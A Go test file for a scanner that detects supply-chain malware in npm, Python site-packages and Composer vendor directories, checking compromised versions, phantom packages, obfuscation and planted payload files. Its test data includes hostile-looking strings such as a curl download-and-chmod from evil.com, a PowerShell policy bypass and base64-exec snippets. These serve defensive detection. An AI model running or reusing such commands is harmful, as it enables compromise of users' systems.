package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestAnalyzeScript(t *testing.T) {
	tests := []struct {
		script string
		want   int // minimum number of flags
	}{
		{"node index.js", 0},
		{"curl -o /tmp/payload http://evil.com && chmod +x /tmp/payload", 1},
		{"powershell -ExecutionPolicy Bypass -WindowStyle Hidden", 3},
		{"eval(atob('base64stuff'))", 2},
		{"nohup python3 /tmp/ld.py > /dev/null 2>&1 &", 2},
		{"node setup.js", 0},
	}

	for _, tt := range tests {
		flags := analyzeScript(tt.script)
		if len(flags) < tt.want {
			t.Errorf("analyzeScript(%q) returned %d flags, want >= %d (got: %v)",
				tt.script, len(flags), tt.want, flags)
		}
	}
}

func TestCheckFileObfuscation(t *testing.T) {
	dir := t.TempDir()

	// Clean file
	clean := filepath.Join(dir, "clean.js")
	os.WriteFile(clean, []byte(`console.log("hello world");`), 0644)
	if flags := checkFileObfuscation(clean); len(flags) != 0 {
		t.Errorf("clean file flagged: %v", flags)
	}

	// Obfuscated file
	obf := filepath.Join(dir, "obf.js")
	content := `var a = eval(atob("` + repeatStr("\\x41", 25) + `"));`
	content += "\nvar b = Buffer.from(x, 'base64'); Buffer.from(y, 'base64'); Buffer.from(z, 'base64'); Buffer.from(w, 'base64');"
	os.WriteFile(obf, []byte(content), 0644)
	flags := checkFileObfuscation(obf)
	if len(flags) == 0 {
		t.Error("obfuscated file not flagged")
	}
}

func TestPhantomDependency(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	// Create a phantom dependency
	phantomDir := filepath.Join(nm, "plain-crypto-js")
	os.MkdirAll(phantomDir, 0755)
	writePackageJSON(t, phantomDir, "plain-crypto-js", "4.2.1")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	found := false
	for _, f := range s.Findings {
		if f.Check == "phantom-dependency" {
			found = true
			break
		}
	}
	if !found {
		t.Error("phantom dependency not detected")
	}
}

func TestCompromisedVersion(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	axiosDir := filepath.Join(nm, "axios")
	os.MkdirAll(axiosDir, 0755)
	writePackageJSON(t, axiosDir, "axios", "1.14.1")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-version" {
			found = true
			break
		}
	}
	if !found {
		t.Error("compromised version not detected")
	}
}

func TestCleanScan(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	// Create a clean package
	pkgDir := filepath.Join(nm, "express")
	os.MkdirAll(pkgDir, 0755)
	writePackageJSON(t, pkgDir, "express", "4.18.2")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	if len(s.Findings) != 0 {
		t.Errorf("clean scan produced findings: %v", s.Findings)
	}
}

func TestMaliciousPthFile(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(sp, 0755)

	// Known malicious .pth file
	os.WriteFile(filepath.Join(sp, "litellm_init.pth"), []byte("import os; os.system('curl ...')"), 0644)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "malicious-pth-file" {
			found = true
			break
		}
	}
	if !found {
		t.Error("malicious .pth file not detected")
	}
}

func TestSuspiciousPthFile(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(sp, 0755)

	// Unknown .pth file with multiple suspicious patterns
	os.WriteFile(filepath.Join(sp, "sneaky.pth"), []byte("import subprocess; exec(base64.b64decode('payload'))"), 0644)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "suspicious-pth-file" {
			found = true
			break
		}
	}
	if !found {
		t.Error("suspicious .pth file not detected")
	}
}

func TestCleanPthFile(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(sp, 0755)

	// Normal .pth file (just a path)
	os.WriteFile(filepath.Join(sp, "my_package.pth"), []byte("/opt/my_package\n"), 0644)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	if len(s.Findings) != 0 {
		t.Errorf("clean .pth file produced findings: %v", s.Findings)
	}
}

func TestCompromisedPythonVersion(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(filepath.Join(sp, "litellm-1.82.7.dist-info"), 0755)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-python-version" {
			found = true
			break
		}
	}
	if !found {
		t.Error("compromised Python version not detected")
	}
}

func TestCleanPythonVersion(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	os.MkdirAll(filepath.Join(sp, "litellm-1.82.6.dist-info"), 0755)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	if len(s.Findings) != 0 {
		t.Errorf("clean Python version produced findings: %v", s.Findings)
	}
}

func TestPythonUnderscoreNormalization(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "lib", "python3.11", "site-packages")
	// PyPI sometimes uses underscores in dist-info directory names
	os.MkdirAll(filepath.Join(sp, "litellm-1.82.8.dist-info"), 0755)

	entries, _ := os.ReadDir(sp)
	s := New(dir, false)
	s.checkSitePackagesDir(sp, entries)

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-python-version" {
			found = true
			break
		}
	}
	if !found {
		t.Error("compromised Python version with underscore normalization not detected")
	}
}

func TestAnalyzePthContent(t *testing.T) {
	tests := []struct {
		content string
		want    int
	}{
		{"/opt/my_package\n", 0},
		{"import subprocess; subprocess.call(['curl', 'http://evil.com'])", 1},
		{"import os; exec(base64.b64decode('...'))", 2},
		{"./local_path\n../relative\n", 0},
	}

	for _, tt := range tests {
		flags := analyzePthContent(tt.content)
		if len(flags) < tt.want {
			t.Errorf("analyzePthContent(%q) returned %d flags, want >= %d (got: %v)",
				tt.content, len(flags), tt.want, flags)
		}
	}
}

func TestNpmPayloadFile(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	// Plant router_init.js inside a @tanstack package — should be flagged
	// regardless of whether the version is on the known-bad list.
	pkgDir := filepath.Join(nm, "@tanstack", "react-router")
	os.MkdirAll(pkgDir, 0755)
	writePackageJSON(t, pkgDir, "@tanstack/react-router", "1.999.0") // version NOT in the bad list
	os.WriteFile(filepath.Join(pkgDir, "router_init.js"), []byte("// payload"), 0644)

	// Plant a benign @tanstack package — must not be flagged.
	cleanDir := filepath.Join(nm, "@tanstack", "query")
	os.MkdirAll(cleanDir, 0755)
	writePackageJSON(t, cleanDir, "@tanstack/query", "5.0.0")
	os.WriteFile(filepath.Join(cleanDir, "index.js"), []byte("// legit"), 0644)

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	foundPayload := false
	for _, f := range s.Findings {
		if f.Check == "npm-payload-file" && strings.Contains(f.Path, "router_init.js") {
			foundPayload = true
		}
		if f.Check == "npm-payload-file" && strings.Contains(f.Path, "query") {
			t.Errorf("benign @tanstack/query was flagged: %v", f)
		}
	}
	if !foundPayload {
		t.Error("router_init.js payload in @tanstack package not detected")
	}
}

func TestPhantomTanstackSetup(t *testing.T) {
	dir := t.TempDir()
	nm := filepath.Join(dir, "node_modules")

	// @tanstack/setup is a fabricated package — its presence is always malicious.
	phantomDir := filepath.Join(nm, "@tanstack", "setup")
	os.MkdirAll(phantomDir, 0755)
	writePackageJSON(t, phantomDir, "@tanstack/setup", "0.0.0")

	s := New(dir, false)
	s.checkNodeModulesDir(nm)

	found := false
	for _, f := range s.Findings {
		if f.Check == "phantom-dependency" && strings.Contains(f.Path, "@tanstack/setup") {
			found = true
		}
	}
	if !found {
		t.Error("@tanstack/setup phantom dependency not detected")
	}
}

func TestProjectArtifact(t *testing.T) {
	dir := t.TempDir()

	// Plant a known malicious file inside a project-local .claude/ directory.
	projectClaude := filepath.Join(dir, "myproject", ".claude")
	os.MkdirAll(projectClaude, 0755)
	os.WriteFile(filepath.Join(projectClaude, "router_runtime.js"), []byte("// payload"), 0644)

	// Also plant a benign file the scanner must not flag.
	benignClaude := filepath.Join(dir, "cleanproject", ".claude")
	os.MkdirAll(benignClaude, 0755)
	os.WriteFile(filepath.Join(benignClaude, "settings.json"), []byte("{}"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	found := false
	for _, f := range s.Findings {
		if f.Check == "project-artifact" && strings.Contains(f.Path, "router_runtime.js") {
			found = true
		}
		if f.Check == "project-artifact" && strings.Contains(f.Path, "settings.json") {
			t.Errorf("benign .claude/settings.json was flagged: %v", f)
		}
	}
	if !found {
		t.Error("malicious .claude/router_runtime.js not detected")
	}
}

func TestCompromisedComposerVersionV2(t *testing.T) {
	dir := t.TempDir()
	composerDir := filepath.Join(dir, "myproject", "vendor", "composer")
	os.MkdirAll(composerDir, 0755)

	// Composer 2.x installed.json envelope shape.
	installed := `{"packages":[{"name":"intercom/intercom-php","version":"5.0.2"},{"name":"symfony/console","version":"6.4.0"}]}`
	os.WriteFile(filepath.Join(composerDir, "installed.json"), []byte(installed), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-composer-version" && strings.Contains(f.Detail, "intercom/intercom-php") {
			found = true
		}
		if f.Check == "compromised-composer-version" && strings.Contains(f.Detail, "symfony/console") {
			t.Errorf("benign symfony/console was flagged: %v", f)
		}
	}
	if !found {
		t.Error("compromised composer version not detected (v2 format)")
	}
}

func TestCompromisedComposerVersionV1(t *testing.T) {
	dir := t.TempDir()
	composerDir := filepath.Join(dir, "myproject", "vendor", "composer")
	os.MkdirAll(composerDir, 0755)

	// Composer 1.x installed.json — flat top-level array.
	installed := `[{"name":"intercom/intercom-php","version":"5.0.2"}]`
	os.WriteFile(filepath.Join(composerDir, "installed.json"), []byte(installed), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-composer-version" {
			found = true
		}
	}
	if !found {
		t.Error("compromised composer version not detected (v1 format)")
	}
}

func TestComposerVPrefixVersion(t *testing.T) {
	dir := t.TempDir()
	composerDir := filepath.Join(dir, "myproject", "vendor", "composer")
	os.MkdirAll(composerDir, 0755)

	// Composer sometimes records the version with a leading "v" matching the
	// upstream git tag. Our IOC list stores "5.0.2", but installed.json may
	// say "v5.0.2" — both must be flagged.
	installed := `{"packages":[{"name":"intercom/intercom-php","version":"v5.0.2"}]}`
	os.WriteFile(filepath.Join(composerDir, "installed.json"), []byte(installed), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	found := false
	for _, f := range s.Findings {
		if f.Check == "compromised-composer-version" {
			found = true
		}
	}
	if !found {
		t.Error("compromised composer version with v-prefix not detected")
	}
}

func TestCleanComposerVendor(t *testing.T) {
	dir := t.TempDir()
	composerDir := filepath.Join(dir, "myproject", "vendor", "composer")
	os.MkdirAll(composerDir, 0755)

	installed := `{"packages":[{"name":"intercom/intercom-php","version":"5.0.3"},{"name":"symfony/console","version":"6.4.0"}]}`
	os.WriteFile(filepath.Join(composerDir, "installed.json"), []byte(installed), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	for _, f := range s.Findings {
		if f.Check == "compromised-composer-version" {
			t.Errorf("clean composer vendor produced finding: %v", f)
		}
	}
}

func TestNonComposerVendorDir(t *testing.T) {
	dir := t.TempDir()
	// A "vendor" directory that is NOT a Composer vendor (e.g., a Go vendor
	// dir). It must not block the walk from finding deeper artifacts.
	goVendor := filepath.Join(dir, "goproj", "vendor", "github.com", "x", "y")
	os.MkdirAll(goVendor, 0755)

	// Plant a malicious .claude artifact under a path beneath the vendor dir.
	deepClaude := filepath.Join(dir, "goproj", "vendor", "github.com", "x", "y", ".claude")
	os.MkdirAll(deepClaude, 0755)
	os.WriteFile(filepath.Join(deepClaude, "router_runtime.js"), []byte("// payload"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	found := false
	for _, f := range s.Findings {
		if f.Check == "project-artifact" && strings.Contains(f.Path, "router_runtime.js") {
			found = true
		}
	}
	if !found {
		t.Error("walk SkipDir'd a non-Composer vendor and missed deeper artifact")
	}
}

func writePackageJSON(t *testing.T, dir, name, version string) {
	t.Helper()
	pkg := packageJSON{
		Name:    name,
		Version: version,
		Scripts: map[string]string{},
	}
	data, _ := json.Marshal(pkg)
	os.WriteFile(filepath.Join(dir, "package.json"), data, 0644)
}

func repeatStr(s string, n int) string {
	var result strings.Builder
	for range n {
		result.WriteString(s)
	}
	return result.String()
}
